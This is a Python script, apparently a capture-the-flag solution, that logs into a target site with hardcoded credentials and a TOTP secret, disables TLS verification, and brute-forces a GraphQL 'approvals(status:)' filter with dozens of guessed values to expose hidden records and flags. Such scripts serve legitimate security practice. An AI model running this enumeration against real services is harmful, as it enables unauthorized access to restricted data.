#!/usr/bin/env python3
"""Verifier GraphQL: enumerate approvals(status:) to reveal hidden approvals + their refs."""
import re, json, base64, hmac, hashlib, struct, time
import requests, urllib3
urllib3.disable_warnings()
V="https://verifier.hackthe.website"; TOTP_SECRET="JBSWY3DPEHPK3PXP"
FLAG_RE=re.compile(r'dome\.ctf\{[^}]+\}')
def totp():
    k=base64.b32decode(TOTP_SECRET)
    h=hmac.new(k,struct.pack(">Q",int(time.time()//30)),hashlib.sha1).digest()
    o=h[-1]&15
    return str((struct.unpack(">I",h[o:o+4])[0]&0x7fffffff)%10**6).zfill(6)
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{V}/api/login", json={"username":"ops_dispatcher","password":"Ops-Fall-2026!"}, timeout=20)
s.post(f"{V}/api/otp/verify", json={"otp":totp()}, timeout=20)
def gql(q):
    r=s.post(f"{V}/graphql", json={"query":q}, timeout=20); return r.text

baseline_ids={"AP-1001","AP-1002","AP-1003","AP-1007","AP-1009","AP-1010","AP-1011"}
statuses=["pending","denied","rejected","escalated","revoked","hold","onhold","on_hold",
 "flagged","review","in_review","pending_review","draft","archived","deployment","internal",
 "classified","restricted","secret","blocked","open","closed","expired","approved","all",
 "DENIED","PENDING","ESCALATED","REJECTED","HOLD","REVIEW","restricted_ops","deploy","sealed",
 "quarantine","withheld","suppressed","hidden","confidential","embargoed"]
seen=set()
for st in statuses:
    t=gql('{approvals(status:"%s"){id approvedBy ref}}'%st)
    try:
        data=json.loads(t).get("data",{}).get("approvals")
        if data is None: continue
        ids={a["id"] for a in data}
        new=ids-baseline_ids
        if new or (ids and ids!=baseline_ids):
            print(f"\nstatus='{st}' -> {json.dumps(data)[:500]}")
            for m in FLAG_RE.finditer(t): print("   *** FLAG:", m.group())
            seen|=ids
    except Exception as e:
        pass

# also try status as array / enum (no quotes)
for st in ["PENDING","DENIED","ESCALATED","DEPLOYMENT","INTERNAL","RESTRICTED","SEALED"]:
    t=gql('{approvals(status:%s){id approvedBy ref}}'%st)
    if "AP-100" in t and '"errors"' not in t:
        print(f"\nenum status {st}: {t[:400]}")

print("\nall ids seen:", sorted(seen))
